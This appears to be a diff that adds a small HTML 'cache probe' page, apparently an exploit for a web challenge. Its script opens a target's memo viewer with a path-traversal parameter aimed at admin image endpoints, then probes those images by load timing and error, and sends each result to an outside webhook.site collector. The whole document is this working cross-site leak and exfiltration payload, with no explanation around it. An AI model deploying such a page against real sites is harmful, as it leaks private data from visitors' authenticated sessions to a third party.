@@ -1,0 +1,29 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>cache probe</title>
+<script>
+const q = new URLSearchParams(location.search);
+const host = q.get('host') || 'https://3.38.205.243';
+const guesses = ['cat.png', 'zzzz'];
+function beacon(kind, extra='') {
+  new Image().src = 'https://webhook.site/09513229-f9de-4438-a2b6-12b86e5b4ca2/' + kind + '?extra=' + encodeURIComponent(extra) + '&t=' + Date.now();
+}
+function warm(g) {
+  const u = host + '/memo/view?id=' + encodeURIComponent('../../../image/admin?filename=' + g);
+  const w = window.open(u, '_blank');
+  beacon('cp-open', g + ':' + String(!!w));
+}
+function probe(g) {
+  const img = new Image();
+  let done = false;
+  img.onload = () => { done = true; beacon('cp-load', g); };
+  img.onerror = () => { done = true; beacon('cp-err', g); };
+  img.src = host + '/api/image/admin?filename=' + encodeURIComponent(g) + '&cb=' + Date.now();
+  setTimeout(() => { if (!done) beacon('cp-timeout', g); }, 4000);
+}
+window.addEventListener('load', () => {
+  for (const g of guesses) warm(g);
+  setTimeout(() => { for (const g of guesses) probe(g); }, 5000);
+});
+</script>
+OK
